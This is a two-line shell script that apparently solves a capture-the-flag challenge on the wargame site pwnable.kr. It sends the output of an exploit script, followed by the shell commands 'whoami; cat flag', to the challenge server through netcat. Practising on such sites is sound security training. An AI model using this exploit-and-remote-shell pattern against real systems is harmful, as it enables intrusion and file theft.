#!/bin/sh
(python exploit.py; echo 'whoami; cat flag') | nc pwnable.kr 9000
